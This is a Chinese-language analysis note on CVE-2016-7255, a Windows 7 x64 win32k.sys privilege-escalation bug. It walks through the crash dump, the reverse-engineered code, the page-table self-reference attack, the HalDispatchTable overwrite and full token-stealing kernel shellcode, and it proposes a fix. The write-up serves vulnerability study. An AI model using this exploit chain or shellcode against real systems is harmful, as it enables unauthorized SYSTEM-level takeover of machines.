# CVE-2016-7255_Win内核提权漏洞分析笔记

@elemeta

*本文的分析是基于 https://www.exploit-db.com/exploits/41015/ 的提权代码写的*

## 漏洞描述

漏洞出现在win32k.sys的xxxNextWindow函数中,该函数是用来处理ALT-TAB进程切换窗口的，
由NtSetWindowLongPtr()设置的不合适的参数可以在xxxNextWindow中给任意内存地址进行
or 0x4操作。

## 漏洞分析

- 实验环境：Windows 7 SP1 x64 (6.1.7601.17514)
- WIN32K.SYS：md5 = a89392a32ba98468710fd7e38318934b
- 分析工具：WinDbg、IDA 6.6

漏洞实现的第一个步骤是通过SetWindowLongPtr函数的GWLP_ID属性将任意地址设置到窗口
内核对象(tagMENU)中.

    LONG_PTR WINAPI SetWindowLongPtr(
        _In_ HWND     hWnd,
        _In_ int      nIndex,
        _In_ LONG_PTR dwNewLong
    );

GWLP_ID的值是-12(0FFFFFFF4h)，用来给子窗口设置一个ID值，该值的长度是一个指针大小。
我们修改Exploit程序让操作系统触发Bugcheck：

    // 这句是关键代码
    SetWindowLongPtr(hWndChild, GWLP_ID, (LONG_PTR)0x4141414141414141);

执行后出现BSOD，分析转储文件：

    0: kd> !analyze -v
       EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - 0x%p

       FAULTING_IP: 
       win32k!xxxNextWindow+99c
       fffff960`00193360 83482804        or      dword ptr [rax+28h],4   // 漏洞触发点

       CONTEXT:  fffff880040b1d10 -- (.cxr 0xfffff880040b1d10)
       rax=4141414141414141 rbx=0000000000000000 rcx=0000000000000000   // rax是写入的GWLP_ID的值
       rdx=fffff900c0800b90 rsi=fffff900c082a9d0 rdi=fffff900c082ab50
       rip=fffff96000193360 rsp=fffff880040b26f0 rbp=0000000000000002
       r8=0000000000000000  r9=0000000000000000 r10=fffff880040b2160
       r11=fffffa801a9b8750 r12=0000000000000001 r13=fffff900c082a9d0
       r14=fffff900c1ce3c30 r15=000000000000001b
       iopl=0         nv up ei pl nz na po nc
       cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
       win32k!xxxNextWindow+0x99c:
       fffff960`00193360 83482804        or      dword ptr [rax+28h],4 ds:002b:41414141`41414169=????????

       STACK_TEXT:  
       fffff880`040b26f0 fffff960`00178dec : fffff880`040b291b 00000000`0000001b fffff880`00000000 00000000`00000000 : win32k!xxxNextWindow+0x99c
       fffff880`040b2880 fffff960`0017aa26 : fffff880`040b201b fffff880`040b29e0 fffff960`005defeb 00000000`00000000 : win32k!xxxKeyEvent+0x8ec
       fffff880`040b2940 fffff960`0017b242 : fffff900`c1f6431b 00000000`00000000 00000000`00000000 00000000`00000001 : win32k!xxxProcessKeyEvent+0x37e
       fffff880`040b29b0 fffff960`0017b336 : fffff900`c1f64378 00000000`00000001 00000000`0021f801 00000000`00000000 : win32k!xxxInternalKeyEventDirect+0x23a
       fffff880`040b2a30 fffff960`0015fc86 : fffff900`c1f64360 fffff880`040b2b60 00000000`0021f840 00000000`00000028 : win32k!xxxSendInput+0xb6
       fffff880`040b2a70 fffff800`03e948d3 : fffffa80`1a9b8750 00000000`00000000 00000000`00000020 00000001`3f591a78 : win32k!NtUserSendInput+0x112
       fffff880`040b2ae0 00000000`76bd8cda : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x13
       00000000`0021f818 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : 0x76bd8cda

漏洞触发的源头是键盘的按键事件，程序路径走到win32k!xxxNextWindow+0x99c时触发了非法
内存地址访问，此时rax的值正好是GWLP_ID的值0x4141414141414141。接下来对xxxNextWindow
函数进行了逆向分析，这里只分析和漏洞相关的部分：

    void xxxNextWindow(tagQ *pq, DWORD wParam):
        // 这是两个关键的数据结构
        //  1: kd> dt win32k!tagWND
        //     +0x034 style            : Uint4B
        //     +0x034 bWS_CHILD        : Pos 30, 1 Bit
        //     +0x034 bWS_POPUP        : Pos 31, 1 Bit
        //     +0x0c0 spmenu           : Ptr64 tagMENU
        //  1: kd> dt win32k!tagMENU
        //     +0x028 fFlags           : Uint4B

        tagWND *pwndActivateNext;
        tagMENU *_spmenu;

        // 决定下一个要激活的窗口
        LODWORD(_pwndActivateNext) = GetNextQueueWindow(pwndCurrentActivate, (unsigned int)fDir, 1i64);
        pwndActivateNext = _pwndActivateNext;
        ...
        if ( _pwndActivateNext == pwndCurrentActivate )
          goto LABEL_84;
        goto DoSlowAltTab;

        DoSlowAltTab:
            if ( pwndActivateNext )
            {
              if ( pwndCurrentTopFocus )
              {
                _spmenu = pwndCurrentTopFocus->spmenu;
                if ( _spmenu )
                  _spmenu->fFlags &= 0xFFFFFFFB;        // ClearMF(MFUNDERLINE),这里也有可能触发漏洞
              }
              if ( !fDir && !(pwndCurrentActivate->ExStyle & 8) )
                xxxSetWindowPos((__int64)pwndCurrentActivate, 1, 0i64, 0, NULL, NULL, 25619);// PWND_BOTTOM
              
              // ALT键按下，要在激活的窗口菜单上显示下划线
              if ( pwndActivateNext->spmenu )
                pwndActivateNext->spmenu->fFlags |= 4u; // SetMF(MFUNDERLINE)， 这里就是蓝屏时的位置

蓝屏时的位置win32k!xxxNextWindow+99c(or dword ptr [rax+28h], 4)就是上面pwndActivateNext->
spmenu->fFlags |= 4u;这一句。eax的内容就是pwndActivateNext->spmenu->fFlags的值。

*btw：这块代码描述的是使用ALT+TAB进行进程切换时的逻辑的一部分, Windows的图形界面比
Linux高效几个级别，原来在内核中就有图形界面的支持!*

下面看看是如何通过SetWindowLongPtr系统调用来设置这个tagMENU.fFlags的值的:

用户空间的调用路径是SetWindowLongPtr -> user32.dll!SetWindowLongPtrA -> 
NtUserSetWindowLongPtr系统调用,

    rcx = hWndChild
    rdx = GWLP_ID(0FFFFFFF4h, 即-12)
    r8 = 0x4141414141414141
    r9 = 1(ANSI)

    SetWindowLongPtr:
        000000013F522319 4C 8B 84 24 80 00 00 00 mov      r8,4141414141414141h  
        000000013F522321 BA F4 FF FF FF       mov         edx,0FFFFFFF4h  
        000000013F522326 48 8B 4C 24 60       mov         rcx,qword ptr [hWndChild]  
        000000013F52232B FF 15 67 3F 01 00    call        qword ptr [__imp_SetWindowLongPtrA (013F536298h)]

    user32.dll!SetWindowLongPtrA:
        0000000076BBB500 41 B9 01 00 00 00    mov         r9d,1  
        0000000076BBB506 E9 29 C1 00 00       jmp         _SetWindowLongPtr (076BC7634h)  

    _SetWindowLongPtr:
        0000000076BC7697 E8 84 FF FF FF       call        NtUserSetWindowLongPtr (076BC7620h)

    NtUserSetWindowLongPtr:
        0000000076BC7620 4C 8B D1             mov         r10,rcx  
        0000000076BC7623 B8 3A 13 00 00       mov         eax,133Ah  
        0000000076BC7628 0F 05                syscall 

内核空间的调用路径是：win32k!NtUserSetWindowLongPtr -> xxxSetWindowLongPtr ->
xxxSetWindowData
    
    LONG NtUserSetWindowLongPtr(HWND hwnd, int nIndex, LONG_PTR dwNewLong, BOOL bAnsi):
        .text:FFFFF97FFF0B205C NtUserSetWindowLongPtr proc near        ; DATA XREF: .text:FFFFF97FFF0D38D0o
        .text:FFFFF97FFF0B20E3                 call    xxxSetWindowLongPtr

    ULONG_PTR xxxSetWindowLongPtr(tagWND *pwnd, int index, ULONG_PTR dwData, unsigned int bAnsi, int a5):
        if ( (signed int)_index < 0 ) // index = 0FFFFFFF4h, 小于0
            return xxxSetWindowData(_pwnd, _index, _dwData, _bAnsi);

    ULONG_PTR xxxSetWindowData(tagWND *pwnd, int index, ULONG_PTR dwData, BOOL bAnsi):
        .text:FFFFF97FFF0B1C00                 cmp     edx, 0FFFFFFF4h   ; GWLP_ID = 0FFFFFFF4h
        .text:FFFFF97FFF0B1C03                 jz      loc_FFFFF97FFF0B1F0B
    
        .text:FFFFF97FFF0B1F0B loc_FFFFF97FFF0B1F0B:                   ; CODE XREF: xxxSetWindowData+43j
        .text:FFFFF97FFF0B1F0B                 mov     al, [rcx+37h]  ; pwnd
        .text:FFFFF97FFF0B1F0E                 and     al, 0C0h       ; bit(bWS_CHILD) | bit(bWS_POPUP)
        .text:FFFFF97FFF0B1F10                 cmp     al, 40h        ; bWS_CHILD == 1 && bWS_POPUP == 0
        .text:FFFFF97FFF0B1F12                 jnz     short loc_FFFFF97FFF0B1F24
        .text:FFFFF97FFF0B1F14                 mov     rdi, [rcx+tagWND.spmenu]
        // 这一句实现了GWLP_ID属性的设置
        .text:FFFFF97FFF0B1F1B                 mov     [rcx+tagWND.spmenu], r8    ; r8 = 0x4141414141414141
        .text:FFFFF97FFF0B1F22                 jmp     short loc_FFFFF97FFF0B1F85

上面mov [rcx+tagWND.spmenu], r8这一句实现了rcx = (tagWND *)pwnd, 而byte ptr [rcx+37h]
表示tagWND.sytle[3]：

    1: kd> dt tagWND
       +0x034 style            : Uint4B
       +0x034 bMaximized       : Pos 24, 1 Bit
       +0x034 bWS_CLIPCHILDREN : Pos 25, 1 Bit
       +0x034 bWS_CLIPSIBLINGS : Pos 26, 1 Bit
       +0x034 bDisabled        : Pos 27, 1 Bit
       +0x034 bVisible         : Pos 28, 1 Bit
       +0x034 bMinimized       : Pos 29, 1 Bit
       +0x034 bWS_CHILD        : Pos 30, 1 Bit
       +0x034 bWS_POPUP        : Pos 31, 1 Bit

其中0xC0位即 style.bWS_CHILD | style.bWS_POPUP, 于是if (([pwn+0x37] & 0xC0) == 
0x40) 相当于if (pwnd.style.bWS_CHILD == 1 && pwnd.style.bWS_POPUP == 0)，通过理
解函数的意思他是用来判断当前窗口是否是一个子窗口的，用C语言表述这段代码：

    #define TestwndChild(pwnd) \
        (pwnd->style.bWS_CHILD == 1 && pwnd->style.bWS_POPUP == 0)

    if (index == GWLP_ID) {
        if (TestwndChild(pwnd)) {
            v12 = (ULONG_PTR)pwnd->spmenu;
            pwnd->spmenu = (tagMENU *)dwData;
        }
    }

## 漏洞利用

该漏洞的利用条件是pwndActivateNext->spmenu->fFlags |= 4u，即把任意地址的第2位置
为1，还要bypass SMAP、SMEP、DEP、ASLR，聪明的利用者想到了下面的办法。

### Windows Paging Attack(Windows分页机制攻击)

https://cansecwest.com/slides/2016/CSW2016_Economou-Nissim_GettingPhysical.pdf
提供了一种攻击Windows x64分页机制的方法。

x64架构的页表分成4级来管理，它们分别是：

- PML4T表（Page Map Level4 Table，4级页映射表），对应表项叫做PML4E，也叫PXE。
- PDPT表（Page Directory Pointer Table，页目录指针表），对应表项叫做PPE。
- PDT表（Page Directory Table，页目录表），对应表项叫做PDE。
- PT表（Page Table，页表），，对应表项叫做PTE。


    47      38       29          20           11             0
    +-------+--------+-----------+------------+--------------+
    | PML4E |  PPE   |    PDE    |    PTE     | page offset  |
    +-------+--------+-----------+------------+--------------+

其中PML4T、PDPT、PDT、PT各占9 bit，分别可索引512个表项，一个页可寻址4K大小的空间，
CR3保存PML4T的基址，每一个表项的大小是8字节。
    
    63    51           12      2 1 0 
    +-+-----+------------+------+-+-+-+
    |N|     |            |      |U|R|P|
    |X|     | Table Base |      |/|/| |
    | |     |            |      |S|W| |
    +-+-----+------------+------+-+-+-+

其中：

- R/W位(bit 1)：读写权限，置为1表示可写，置为0表示只读
- U/S位(bit 2): CPL访问权限，置为1表示允许CPL3(用户空间)访问，置为0表示只允许CPL0访问。
- NX位(bit 63): 执行权限，置为1表示不允许执行，置为0表示允许执行

Windows的内存管理使用了索引表项地址自引用的技术(Self-Ref Entry)，该技术使用表项
中的一个较高的索引来指向PML4T自己。这样的好处是使用虚拟地址通过CPU的寻址就能够
读写PML4T中的项目。以x64为例，使用索引号第0x1ed项作为自引用的表项，对应的虚拟地
址就是0xFFFFF6FB7DBEDF68，而且该地址是固定的：
    
    Binary:  11111111 11111111 11110110 11111011 01111101 10111110 11011111 01101000
    Hex:     fffff6fb`7dbedf68
    
        +---------------------------------------------------+
        |                                                   |
      PML4T    +-->  PDPT     +-->   PD      +-->   PT      |
    +-------+  |   +-------+  |   +-------+  |   +-------+  |   
    |       |  |   |       |  |   |       |  |   |       |  |   
    |       |  |   |       |  |   |       |  |   |       |  |   
    |       |  |   |       |  |   |       |  |   |       |  |   
    |       |  |   |       |  |   |       |  |   |       |  |   
    |  ...  |  |   |  ...  |  |   |       |  |   |       |  |   
    | 0x1ed |--+   | 0x1ed |--+   | 0x1ed |--+   | 0x1ed |--+   
    |  ...  |      |  ...  |      |  ...  |      |  ...  |      
    +-------+      +-------+      +-------+      +-------+      
    
    1: kd> !pte 0xFFFFF6FB7DBEDF68
                                           VA fffff6fb7dbed000
    PXE at FFFFF6FB7DBEDF68    PPE at FFFFF6FB7DBEDF68    PDE at FFFFF6FB7DBEDF68    PTE at FFFFF6FB7DBEDF68
    contains 0000000000187063  contains 0000000000187063  contains 0000000000187063  contains 0000000000187063
    pfn 187       ---DA--KWEV  pfn 187       ---DA--KWEV  pfn 187       ---DA--KWEV  pfn 187       ---DA--KWEV
    
*BlackHat 2016上微软宣布X64系统上PML4T表项地址也加入了ASLR套餐*

我们触发漏洞的代码pwndActivateNext->spmenu->fFlags |= 4u正好可以将U/S位置为1，
我们的目的是要把PML4T的自引用的页表项的U/S为置1，这样在用户空间就可以访问PML4T
项目了，下面是修改前后的对比。

利用代码执行前：

    1: kd> !process 0 0
    PROCESS fffffa801a59c440
        SessionId: 1  Cid: 0240    Peb: 7fffffdd000  ParentCid: 0bcc
        DirBase: 5cb99000  ObjectTable: fffff8a001ded420  HandleCount:  27.
        Image: cve_2016_7255.exe
    
    1: kd> .process /i 0xfffffa801a59c440
    
    0: kd> !pte 0xFFFFF6FB7DBEDF68
                                               VA fffff6fb7dbed000
    PXE at FFFFF6FB7DBEDF68    PPE at FFFFF6FB7DBEDF68    PDE at FFFFF6FB7DBEDF68    PTE at FFFFF6FB7DBEDF68
    contains 000000005CB99863  contains 000000005CB99863  contains 000000005CB99863  contains 000000005CB99863
    pfn 5cb99     ---DA--KWEV  pfn 5cb99     ---DA--KWEV  pfn 5cb99     ---DA--KWEV  pfn 5cb99     ---DA--KWEV

利用代码执行之后：

    0: kd> !pte 0xFFFFF6FB7DBEDF68
                                               VA fffff6fb7dbed000
    PXE at FFFFF6FB7DBEDF68    PPE at FFFFF6FB7DBEDF68    PDE at FFFFF6FB7DBEDF68    PTE at FFFFF6FB7DBEDF68
    contains 000000005CB99867  contains 000000005CB99867  contains 000000005CB99867  contains 000000005CB99867
    pfn 5cb99     ---DA--UWEV  pfn 5cb99     ---DA--UWEV  pfn 5cb99     ---DA--UWEV  pfn 5cb99     ---DA--UWEV

其中的控制位已经由 ---DA--KWEV 变成了 ---DA--UWEV。

### 创建新的页表项

PML4T自引用地址0xFFFFF6FB7DBEDF68所在的页还有好多虚拟地址没有使用，这些地址可以
用来映射我们需要访问的任何内核地址，更新物理地址和页表(U/S=1，R/W=1，NX=0)，让内
核虚拟地址在用户空间拥有RWX权限。代码中的create_spurious_pte_to_virtual_address
函数实现了该功能。

- 创建页表项使得在用户空间读取HalDispatchTable+0x08处的值：

        UINT64 original_pointer = get_OverwriteAddress_pointer(overwrite_address, overwrite_offset);

- 创建页表项把shellcode代码写入内核空间内存0xffffffffffd00d50处，并拥有执行权限：

        UINT64 shellcode_va = store_shellcode_in_hal();

- 创建页表项把shellcode的地址0xffffffffffd00d50写到HalDispatchTable+0x08位置:

        overwrite_TargetAddress(shellcode_va, overwrite_address, overwrite_offset);

### Shellcode

我们利用HalDispatchTable来提权，把HalDispatchTable+0x08处替换成shellcode的地址，
然后应用层调用NtQueryIntervalProfile函数来触发执行shellcode。

    1: kd> dq HalDispatchTable
        fffff800`04006c60  00000000`00000004 fffff800`044388e8

    1: kd> uf fffff800`044388e8
    hal!HaliQuerySystemInformation:
    fffff800`044388e8 fff3            push    rbx
    ...

    1: kd> uf NtQueryIntervalProfile
    fffff800`042120d8 e8930affff      call    nt!KeQueryIntervalProfile (fffff800`04202b70)
    
    1: kd> uf nt!KeQueryIntervalProfile
    nt!KeQueryIntervalProfile:
    fffff800`04202b70 4883ec38        sub     rsp,38h
    fffff800`04202b74 85c9            test    ecx,ecx  ; ecx不能为0，即NtQueryIntervalProfile的第一个参数
    fffff800`04202b76 7508            jne     nt!KeQueryIntervalProfile+0x10 (fffff800`04202b80)


    nt!KeQueryIntervalProfile+0x10:
    fffff800`04202b80 83f901          cmp     ecx,1 ; ecx不能为1
    fffff800`04202b83 7508            jne     nt!KeQueryIntervalProfile+0x1d (fffff800`04202b8d)

    // 这里执行shellcode
    nt!KeQueryIntervalProfile+0x1d:
    fffff800`04202ba3 ff15bf40e0ff    call    qword ptr [nt!HalDispatchTable+0x8 (fffff800`04006c68)]

shellcode运行在内核空间，它的主要作用是把当前用户的Token替换成SYSTEM的，这样我们
就拥有了SYSTEM的权限，思路和Linux下的一致，下面伪代码描述了shellcode的主要步骤：

    shellcode:
        // 恢复HalDispatchTable + 0x08原来的值，防止系统出错
        RestoreHalDispatchTable(OriginalPointer)

        // 得到进程列表
        atciveProcLinks = _ETHREAD->ApcState->Process->ActiveProcessLinks

        // 得到SYSTEM的TOKEN
        foreach proc in atciveProcLinks:
            pid = proc.UniqueProcessID
            if pid == 4:  // 4 是System进程的PID，它的所有者是SYSTEM
                systemToken = proc.Token
        
        // 替换当前进程的TOKEN
        foreach proc in atciveProcLinks:
            pid == proc.UniqueProcessID
            if pid = current_pid
                currentToken = systemToken;

汇编代码如下：

        cli
        pushfq

        ; 把HalDispatchTable+0x08原来的函数地址还原回去
        mov  rax, OriginalPointer
        push rax                   
        push rcx
        mov  rcx, [OverwriteAddr + OverwriteOffset]
        mov  qword ptr [rcx], rax

        mov  ecx, PID   ; ecx保存当前的PID
        push rbx,

        mov  rax, qword ptr gs:0x188  ; gs:0x188保存的是当前线程的_ETHREAD, 也是_KTHREAD。

        ; 得到 _KPROCESS
        ; 1: kd> dt nt!_ETHREAD
        ;    +0x000 Tcb              : _KTHREAD
        ; 1: kd> dt nt!_KTHREAD
        ;    +0x050 ApcState         : _KAPC_STATE
        ; 1: kd> dt nt!_KAPC_STATE
        ;    +0x020 Process          : Ptr64 _KPROCESS
        ; 得到_KPROCESS也就得到了_EPROCESS,因为：
        ;   1: kd> dt nt!_EPROCESS
        ;      +0x000 Pcb              : _KPROCESS

        mov  rax, qword ptr [rax + 0x70]

        ; 得到 ActiveProcessLinks
        ; 1: kd> dt nt!_EPROCESS
        ;    +0x000 Pcb              : _KPROCESS
        ;    +0x188 ActiveProcessLinks : _LIST_ENTRY

        lea  rax, [rax + 0x188]

    tag:
        mov  rax, qword ptr [rax]

        ; 得到PID
        ; 1: kd> dt nt!_EPROCESS
        ;    +0x180 UniqueProcessId  : Ptr64 Void
        ;    +0x188 ActiveProcessLinks : _LIST_ENTRY

        mov  rbx, qword ptr [rax - 0x8] ;UniqueProcessID
        cmp  rbx, 0x4   ; 4 是System进程的PID
        jne  tag

        ; 得到token
        ; 1: kd> dt nt!_EPROCESS
        ;    +0x188 ActiveProcessLinks : _LIST_ENTRY
        ;    +0x208 Token            : _EX_FAST_REF

        mov  rbx, qword ptr [rax + 0x80] ; TOKEN of SYSTEM

        push rbx

    tag2:
        mov  rax, qword ptr [rax]
        mov  rbx, qword ptr [rax - 0x8] ; UniqueProcessID
        cmp  ebx, ecx ; 比较是不是当前进程
        jne  tag2
        pop  rbx
        mov  qword ptr[rax + 0x80], rbx ; 替换Token

        pop  rbx
        pop  rcx
        pop  rax
        popfq

        sti
        jmp  rax  ; 执行原来的函数


### 触发xxxNextWindows

如何触发xxxNextWindows是一个问题，Exploit中给出的方法是模拟ALT-TAB窗口的操作来完
成，见代码中_sim_前缀的函数。

*更详细的请看利用代码41015.c中的注释*

## 漏洞修复

通过分析漏洞发现，当xxxNextWindow在处理子窗口的时候才会触发任意地址写，于是我们只
要屏蔽掉子窗口就行了。

    void xxxNextWindow(tagQ *pq, DWORD wParam):
    if (pwndActivateNext) {
        if (pwndCurrentTopFocus) {
            _spmenu = pwndCurrentTopFocus->spmenu;
            // 添加判断pwndCurrentTopFocus是不是子窗口
            if ( !TestwndChild(pwndCurrentTopFocus) && _spmenu )
                _spmenu->fFlags &= 0xFFFFFFFB;
        }
        ...            
        // 添加判断pwndActivateNext是不是子窗口
        if ( !TestwndChild(pwndActivateNext) &&  pwndActivateNext->spmenu )
            pwndActivateNext->spmenu->fFlags |= 4u;
    }

    
该漏洞能够成功利用的关键是PML4T的自引用地址是静态的，如果把该地址也加入到ASLR套
餐中估计就要想起他的办法了，而且微软已经这么做了。

## 总结

整个利用过程如下：

1. 使用SetWindowLongPtr，将PML4T的自引用地址当做子窗口的GWLP_ID属性。
2. 模拟ALT-TAB窗口切换触发xxxNextWindow，触发漏斗将PML4T的页表U/S位置位1，此时用户空
   间可以访问PML4T了，我们可以模仿x64内存管理机制将任意内核地址空间映射到应用层了。而且
   bypass了当前版本的所有内存缓解机制。
3. 选择一个内核空间区域存放shellcode，并利用HalDispatchTable+0x08来触发。
4. enjoy!

这个漏洞利用精彩之处是作者想到了“or xxx, 4”的可利用之处，感慨作者的知识储备和功力之深厚。
微软的ASLR机制还有尚未覆盖之处，作者能够发掘它们的利用方法，思路值得我们学习。

https://www.exploit-db.com/exploits/40745/提供了漏洞的PoC，实现了Windows拒绝服务
攻击。Enrique Nissim结合该漏洞以及自己在Windows x64内存管理机制的研究成果
(https://github.com/IOActive/I-know-where-your-page-lives/) 完成了稳定的利用代码。
利用的思路非常清晰和美妙，让我感叹漏洞利用真的是一门艺术，它需要非常深厚的技术知
识和丰富的想象力。

一方面我们可以举一反三学习作者的利用思路，另一方面我们更要学习作者的丰富的经验，
储备更多的技术知识，让自己在研究上走得更深和更广。

## 参考

- https://www.exploit-db.com/exploits/41015/
- http://bobao.360.cn/learning/detail/3359.html
- https://www.exploit-db.com/docs/40822.pdf
- https://ricklarabee.blogspot.com/2017/01/virtual-memory-page-tables-and-one-bit.html
- https://security.googleblog.com/2016/10/disclosing-vulnerabilities-to-protect.html
- https://www.coresecurity.com/blog/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-2-windows
